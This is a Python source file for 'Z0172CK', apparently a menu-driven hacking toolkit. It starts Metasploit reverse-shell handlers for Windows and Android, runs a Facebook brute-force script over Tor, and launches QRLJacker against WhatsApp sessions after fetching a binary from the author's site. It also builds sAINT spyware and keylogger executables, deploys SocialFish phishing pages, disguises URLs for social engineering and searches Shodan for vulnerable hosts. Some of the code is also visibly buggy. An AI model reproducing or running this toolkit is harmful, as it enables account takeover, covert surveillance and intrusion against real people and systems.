from colorama import Fore, init
import core.PayloadGenerate as PayloadGenerate
import core.camHackers as camHackers
import core.UrlHider as UrlHider
import banners
import subprocess
import ipinfo
import shodan
import random
import time
import json
import sys
import os

init()

colors = [Fore.LIGHTBLUE_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTRED_EX]
color = random.choice(colors)

ProgramName = 'Z0172CK'
Version = 'V1.2'

PrintBanners = True

#Variable de Metasploit
Port = '444'
Host = '192.168.0.4'

#Variables de Shodan
vulns = False

class SearchShodan:
    def __init__(self, API):
        self.api = shodan.Shodan(API)
    
    def SearchingShodan(self, string):
        none = 'null'
        global vulns, PrintBanners

        ResultFile = open('result/Shodan.json', 'w')
        
        try:
            if PrintBanners == True:
                banners.println(2)
            result = self.api.search(str(string))
            print('[{}!{}] Resoult found: {}'.format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result['total']))
            print("")
            #print(json.dumps(result, sort_keys=True, indent=2))
            ResultFile.write(str(json.dumps(result, sort_keys=True, indent=3)))
            ResultFile.close()

            for data in result['matches']:
                print("[{}+{}] IP: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, data['ip_str']))
                print("[{}+{}] ISP: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, data['isp']))
                print("[{}+{}] Location: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, json.dumps(data['location'], sort_keys=True, indent=2)))
                print("[{}+{}] Organization: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, data['org']))
                print("[{}+{}] Operating System: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, data['os']))
                print("[{}+{}] Port: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, data['port']))
                print("[{}+{}] Product: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, data.get('product', 'null')))
                print("[{}+{}] Version: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, data.get('version', 'null')))
                #print("[{}+{}] Vulnerabilities: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, json.dumps(data.get('vulns', 'null'), sort_keys=True, indent=2)))
                if vulns == True:
                    print("[{}+{}] Vulnerabilities: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, json.dumps(data.get('vulns', 'null'), sort_keys=True, indent=2)))
                print('')
            print("Results saved in {}result/Shodan.json{}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
            time.sleep(2)
            banner()
            main()

        except Exception as e:
            print(f'Ha ocurido un error: {e}')
            result = []
            return result
            
class Metasploit:
    def MSF():
        global ProgramName , color
        global Port
        global Host
        payload = 'none'
        
        print("")
        print("{}Select platform type{}".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        print("")
        print("[{}01{}] Windows".format(color, Fore.LIGHTWHITE_EX))
        print("[{}02{}] Android".format(color, Fore.LIGHTWHITE_EX))
        print("[{}03{}] Linux".format(color, Fore.LIGHTWHITE_EX))
        print("")

        option = input(str(" {} ({}Metasploit/MSF{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

        if option == '01' or option == '1' or option == 'windows':
            print("Select the Payload")
            print("")
            print("[{}01{}] windows/meterpreter/reverse_tcp".format(color, Fore.LIGHTWHITE_EX))
            print("[{}02{}] windows/meterpreter/reverse_http".format(color, Fore.LIGHTWHITE_EX))
            print("[{}03{}] windows/meterpreter/reverse_https".format(color, Fore.LIGHTWHITE_EX))
            print("[{}04{}] windows/meterpreter/bind_tcp".format(color, Fore.LIGHTWHITE_EX))
            print("[{}05{}] windows/shell/bind_tcp".format(color, Fore.LIGHTWHITE_EX))
            print("[{}06{}] windows/shell/reverse_tcp".format(color, Fore.LIGHTWHITE_EX))

            option2 = input(str(" {} ({}Metasploit/MSF{}) Payload > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

            if option2 == '01' or option2 == '1' or option2 == 'windows/meterpreter/reverse_tcp':
                payload = 'windows/meterpreter/reverse_tcp'

            elif option2 == '02' or option2 == '2':
                payload = 'windows/meterpreter/reverse_http'

            elif option2 == '03' or option2 == '3':
                payload = 'windows/meterpreter/reverse_https'

            elif option2 == '04' or option2 == '4':
                payload = 'windows/meterpreter/bind_tcp'

            elif option2 == '05' or option2 == '5':
                payload = 'windows/shell/bind_tcp'

            elif option2 == '06' or option2 == '6':
                payload = 'windows/shell/reverse_tcp'

        elif option == '02' or option == '2' or option == 'android':
            print("")
            print("Select the Paylod")
            print("[{}01{}] android/meterpreter/reverse_tcp".format(color, Fore.LIGHTWHITE_EX))
            print("[{}02{}] android/meterpreter/reverse_http".format(color, Fore.LIGHTWHITE_EX))
            print("[{}03{}] android/meterpreter/reverse_https".format(color, Fore.LIGHTWHITE_EX))
            print("")

            optionAndroid = input(str(" {} ({}Metasploit/MSF{}) Payload > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

            if optionAndroid == '01' or optionAndroid == '1':
                payload = 'android/meterpreter/reverse_tcp'
            
            elif optionAndroid == '02' or optionAndroid == '2':
                payload = 'android/meterpreter/reverse_http'

            elif optionAndroid == '03' or optionAndroid == '3':
                payload = 'android/meterpreter/reverse_https'

        Host = input(str(" {} ({}Metasploit/MSF{}) LHOST > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
        Port = input(str(" {} ({}Metasploit/MSF{}) LPORT > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
        datamsf = f"use exploit/multi/handler;set PAYLOAD {payload};set LHOST {Host}; set LPORT {Port};exploit"
        subprocess.call(["sudo", "msfconsole", "-q", "-x", datamsf])
        mainMetasploit()

    def AutomaticAttack():
        pass

class IPInfo:
    def __init__(self, API):
        self.api = ipinfo.Handler(API)

    def SearchIP(self, IP):
        global PrintBanners
        resultIpInfo = open('result/IpInfo.json', 'w')
        result = self.api.getDetails(IP)
        #print(json.dumps(result.all, sort_keys=True, indent=2))
        resultIpInfo.write(str(json.dumps(result.all, sort_keys=True, indent=2)))
        print("")
        print("[{}+{}] IP = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.ip))
        print("[{}+{}] City = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.city))
        print("[{}+{}] Country = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.country))
        print("[{}+{}] Country Name = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.country_name))
        try:
            print("[{}+{}] Hostname = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.hostname))
        except:
            print("[{}!{}] Hostname = None".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        print("[{}+{}] Coordinates = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.loc))
        print("[{}+{}] Latitude = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.latitude))
        print("[{}+{}] Longitude = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.longitude))
        print("[{}+{}] Organization = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.org))
        print("[{}+{}] Code Postal = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.postal))
        print("[{}+{}] Region = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.region))
        print("[{}+{}] TimeZone = {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, result.timezone))
        print("")
        print("Results Saved in {}result/IpInfo.json{} ".format(Fore.LIGHTRED_EX,Fore.LIGHTWHITE_EX))
        time.sleep(5)
        if PrintBanners == True:
            banner()
        main()

def main():
    global color
    global ProgramName
    global PrintBanners
    print("")
    print("[{}01{}] Shodan          [{}06{}] Scan".format(color, Fore.LIGHTWHITE_EX, color, Fore.LIGHTWHITE_EX))
    print("[{}02{}] Metasploit      [{}07{}] Search Engines".format(color, Fore.LIGHTWHITE_EX, color, Fore.LIGHTWHITE_EX))
    print("[{}03{}] IP Info         [{}08{}] Spy And Keylogger".format(color, Fore.LIGHTWHITE_EX, color, Fore.LIGHTWHITE_EX))
    print("[{}04{}] Brute Force     [{}09{}] Phishing".format(color, Fore.LIGHTWHITE_EX, color, Fore.LIGHTWHITE_EX))
    print("[{}05{}] Exploits".format(color, Fore.LIGHTWHITE_EX))
    print("")
    print("[{}88{}] Update".format(color, Fore.LIGHTWHITE_EX))
    print("[{}99{}] Exit".format(color, Fore.LIGHTWHITE_EX))
    print("")

    options = input(str(" {} > ".format(ProgramName)))

    if options == '01' or options == '1' or options == 'shodan':
        mainShodan()

    elif options == '02' or options == '2':
        mainMetasploit()
    
    elif options == '03' or options == '3':
        mainIPInfo()

    elif options == '04' or options == '4':
        if PrintBanners == True:
            banners.println(6)
        mainBruteForece()

    elif options == '05' or options == '5':
        mainExploits()

    elif options == '06' or options == '6':
        mainScan()

    elif options == '07' or options == '7':
        mainSearchEngines()

    elif options == '08' or options == '8':
        mainSpy()

    elif options == '09' or options == '9':
        mainPhishing()

    elif options == '88' or options == 'update':
        Update()
    
    elif options == '77':
        os.system("git pull")
    
    elif options == '99' or options == 'exit':
        banners.println(0)
        sys.exit

    else:
        print("[{}!] Option not available error{}".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        main()

def mainShodan():
    global ProgramName, color, vulns

    f = open('APIs/Shodan.txt', 'r')
    num = len(f.read())
    if num < 2:
        f.close
        api = open('APIs/Shodan.txt', 'w')
        print("Go to {}https://account.shodan.io/{} to see your API".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        API = input(str("enter your Shodan API: "))
        print("API Save to {}APIs/Shodan.txt{}".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        api.write(API)
        api.close()
        mainShodan()
    
    else:
        files = open('APIs/Shodan.txt', 'r')
        APIKEY = files.read()
        #print(APIKEY)
        user = SearchShodan(str(APIKEY))
        print("")
        search = input(str(" {} ({}Shodan{}) Search > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
        optionVuln = input("You want to see the vulnerabilities y/N > ")

        if optionVuln == 's' or optionVuln == 'S' or optionVuln == 'si' or optionVuln == 'Si' or optionVuln  == 'y' or optionVuln == 'Y':
            vulns = True
        
        else:
            vulns = False

        user.SearchingShodan(search)

def mainMetasploit():
    global ProgramName, color, PrintBanners
    if PrintBanners == True:
        banners.println(1)
    print("")
    print("[{}01{}] Listen Payload".format(color, Fore.LIGHTWHITE_EX))
    print("[{}02{}] Payload Generate".format(color, Fore.LIGHTWHITE_EX))
    #print("[{}03{}] APK Injection".format(color, Fore.LIGHTWHITE_EX))
    print("")
    print("[{}99{}] Back".format(color, Fore.LIGHTWHITE_EX))
    print("")

    option = input(str(" {} ({}Metasploit{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

    if option == '01' or option == '1':
        Metasploit.MSF()
    
    elif option == '02' or option == '2':
        PayloadGenerate.generate()
        banner()
        main()
    
    elif option == '03' or option == '3':
        pass

    elif option == '99':
        banner()
        main()

    else:
        print("{}[!] Option not available{}".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        mainMetasploit()

def mainIPInfo():
    global ProgramName, color
    f = open('APIs/IpInfo.txt', 'r')
    API = f.read()
    #print(API)

    if len(API) < 1:
        f.close()
        Key = open('APIs/IpInfo.txt', 'w')
        print("")
        print("Ingresa a {}https://ipinfo.io/account{} para ver tu access token")
        print("")

        KEY = input("Ingresa tu API o Access Token > ")
        Key.write(KEY)
        API = KEY
        Key.close()

    banners.println(3)
    print("")

    User = IPInfo(API)
    option = input(str("{} ({}IP-Info{}) IP > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

    User.SearchIP(str(option))

def mainBruteForece():
    global ProgramName, color, PrintBanners
    print("")
    print("[{}01{}] Facebook".format(color, Fore.LIGHTWHITE_EX))
    #print("[{}02{}] Hydra".format(color, Fore.LIGHTWHITE_EX))
    print("")
    print("[{}99{}] Back".format(color, Fore.LIGHTWHITE_EX))
    print("")

    option = input(str(" {} ({}BruteForce{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

    if option == '01' or option == '1':
        print("")
        print("[{}01{}] Start Brute Force".format(color, Fore.LIGHTWHITE_EX))
        print("[{}02{}] Continue Brute Force".format(color, Fore.LIGHTWHITE_EX))
        print("")
        print("[{}99{}] Back".format(color, Fore.LIGHTWHITE_EX))
        print("")

        option1 = input(str(" {} ({}BruteForce/Facebook{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

        if option1 == '01' or option1 == '1':
            os.system("sudo chmod +x core/FB-BruteForce/FacebookBruteForce.sh")
            os.system("sudo service tor start")
            os.system("sudo ./core/FB-BruteForce/FacebookBruteForce.sh")
            mainBruteForece()
        
        elif option1 == '02' or option1 == '2':
            os.system("sudo ./core/FB-BruteForce/FacebookBruteForce.sh --resume")
            if PrintBanners == True:
                banners.println(6)
            mainBruteForece()

        elif option1 == '99':
            if PrintBanners == True:
                banners.println(6)
            mainBruteForece()

    elif option == '99': 
        banner()
        main()
    
    else:
        print("{}[!] Option not available{}".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        mainBruteForece()

def mainExploits():
    global ProgramName, color

    print("")
    print("[{}01{}] Cam Hack".format(color, Fore.LIGHTWHITE_EX))
    print("[{}02{}] SET".format(color, Fore.LIGHTWHITE_EX))
    print("[{}03{}] QrJacker ({}WhatssApp{})".format(color, Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
    print("[{}04{}] AndroidSploit".format(color, Fore.LIGHTWHITE_EX))
    print("")
    print("[{}99{}] Back".format(color, Fore.LIGHTWHITE_EX))
    print("")

    option = input(str(" {} ({}Exploit{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

    if option == '01' or option == '1':
        print("")
        camHackers.init()
        mainExploits()

    elif option == '02' or option == '2':
        os.system("sudo setoolkit")

    elif option == '03' or option == '3':
        if os.path.exists("geckodriver") == False:
            os.system("wget https://z0172ck.me/Files/geckodriver")
            os.system("chmod +x geckodriver")
            os.system("sudo cp -f geckodriver /usr/local/share/geckodriver")
            os.system("sudo ln -s /usr/local/share/geckodriver /usr/local/bin/geckodriver")
            os.system("sudo ln -s /usr/local/share/geckodriver /usr/bin/geckodriver")
        
        print("")
        print("Recuerde ir a {}127.0.0.1:1337{} para ver la pagina Phishing".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        #os.system("firefox 127.0.0.1:1337 &")
        print("")
        time.sleep(1)
        #os.system("xterm -hold -e firefox z0172ck.me")
        os.system("cd core/QRLJacker/ && python3 QrlJacker.py -q -r .ataque")

        mainExploits()

    elif option == '04' or option == '4':
        pass

    elif option == '99':
        banner()
        main()
    
    else:
        print("{}[!] Option not available{}".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        mainExploits()

def mainScan():
    global ProgramName, color

    print("")
    print("[{}01{}] Nmap".format(color, Fore.LIGHTWHITE_EX))
    print("[{}02{}] Web Vulnerability Scanner".format(color, Fore.LIGHTWHITE_EX))
    print("")
    print("[{}99{}] Back".format(color, Fore.LIGHTWHITE_EX))

    option = input(str(" {} ({}Scan{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

    if option == '01' or option == '1':
        NmapScan()
    elif option == '02' or option == '2':
        print("")
        print("[{}01{}] Nikto".format(color, Fore.LIGHTWHITE_EX))
        print("")
        print("[{}99{}] Back".format(color,Fore.LIGHTWHITE_EX))
        print("")

        option2 = input(str(" {} ({}WebScan{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

        if option2 == '01' or option2 == '1':
            print("")
            TARGET = input(str(" {} ({}WebScan/Nikto{}) Target > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
            print("")
            os.system(f"nikto -h {TARGET}")
            time.sleep(2)
            mainScan()

        elif option2 == '99':
            mainScan()

        else:
            print("[{}!] Option not available error{}".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
            mainScan()
    elif option == '99':
        main()

    else:
        print("{}[!] Option not available error{}".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        mainScan()

def NmapScan():
    global ProgramName, color
    print("")
    Target = input(str(" {} ({}Scan/Nmap{}) Target > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
    print("Version 1.0")
    os.system(f"sudo nmap -sS -T4 -A -O {Target}")
    time.sleep(2)
    print("")
    main()

def mainSearchEngines():
    global color, ProgramName
    print("")
    print("[{}01{}] Namechk".format(color, Fore.LIGHTWHITE_EX))
    print("")
    print("[{}99{}] Back".format(color, Fore.LIGHTWHITE_EX))
    print("")

    option = input(str(" {} ({}SearchEngines{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
    print("")

    if option == '01'  or option == '1':
        name = input(str(" {} ({}UserNameSE/Namechk{}) Name > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
        os.system(f"bash ./core/Namechk/namechk.sh {name} -fu")
        mainUserSearchEngines()
    
    elif option == '99':
        banner()
        main()

    else:
        print("[{}!] Option not available error{}".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        mainScan()

def mainSpy():
    global ProgramName, color

    print("")
    print("[{}01{}] sAINT ({}java{})".format(color, Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
    #print("[{}02{}] SpyZ ({}Python{})".format(color, Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
    print("")
    print("[{}99{}] Back".format(color, Fore.LIGHTWHITE_EX))
    print("")

    options = input(str(" {} ({}Spy{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

    if options == '1' or options == '01':
        print("")
        if os.path.exists('core/sAINT') == False:
            os.system("cd core/ && git clone https://github.com/tiagorlampert/sAINT && cd sAINT && chmod +x configure.sh && sudo ./configure.sh ")
        
        os.system("cd core/sAINT && sudo java -jar sAINT.jar")
        print("\n\n")
        print("Spy Saved in {}result/sAINT{}.jar an .exe".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
        os.system("sudo cp core/sAINT/target/saint-1.0-jar-with-dependencies.jar result/sAINT.jar")
        os.system("sudo cp core/sAINT/target/saint-1.0-jar-with-dependencies.exe result/sAINT.exe")
        mainSpy()

    elif options == '99':
        main()

    else:
        print("{}[!] Option not available{}".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        mainSpy()

def mainPhishing():
    print("")
    print("[{}01{}] SocialFish".format(color, Fore.LIGHTWHITE_EX))
    print("[{}02{}] Hide custom URL for social engineering".format(color, Fore.LIGHTWHITE_EX))
    print("")
    print("[{}99{}] Back".format(color, Fore.LIGHTWHITE_EX))
    print()

    options = input(str(" {} ({}Phishing{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

    if options == '01' or options == '1':
        if os.path.exists("core/SocialFish/") == False:
            os.system("cd core/ && git clone https://github.com/UndeadSec/SocialFish")
            print("Ok")

        print("")
        try:
            os.system("cd core/SocialFish/ && sudo python3 SocialFish.py admin admin && echo Ok")
        except KeyboardInterrupt:
            mainPhishing()

    elif options == '02' or options == '2':
        UrlHider.main()

    elif options == '99':
        banner()
        main()

    else:
        print("{}[!] Option not avalible{}".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        mainPhishing()

def Update():
    print("[{}+{}] updating".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
    os.system("sudo git pull origin master")
    os.system("bash ./install.sh")
    os.system("sudo pip3 install -r requirements.txt")
    main()

def Configurate():
    global PrintBanners
    print("")
    print("[{}01{}] Print Banners | imprimir los banners")
    print("[{}99{}] Back")
    print("")

    option = input(str(" Z0172CK ({}Configuracion{}) > "))

    if option == '01' or option == '1':
        option1 = input(str("Desea Desactivar los Banners [s/N] : "))
        if option1 == 's' or 'S':
            PrintBanners(False)
            main()
        main()
    
    elif option == '99':
        banner()
        main()

    Configurate
    
def banner():
    global color

    banner ='''{}
    ███████╗ ██████╗  ██╗███████╗██████╗  ██████╗██╗  ██╗
    ╚══███╔╝██╔═████╗███║╚════██║╚════██╗██╔════╝██║ ██╔╝
      ███╔╝ ██║██╔██║╚██║    ██╔╝ █████╔╝██║     █████╔╝ 
     ███╔╝  ████╔╝██║ ██║   ██╔╝ ██╔═══╝ ██║     ██╔═██╗ 
    ███████╗╚██████╔╝ ██║   ██║  ███████╗╚██████╗██║  ██╗
    ╚══════╝ ╚═════╝  ╚═╝   ╚═╝  ╚══════╝ ╚═════╝╚═╝  ╚═╝
            Version V 1.2                      By -Erik172 
    {}'''.format(color, Fore.LIGHTWHITE_EX)

    print(banner)

if __name__ == "__main__":
    if sys.platform == 'linux':
        try:
            banner()
            main()
        except KeyboardInterrupt:
            banners.println(0)
            sys.exit()

    else:
        print(sys.platform)
        print("[{}!{}] Platform not avalible to a".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
        sys.exit()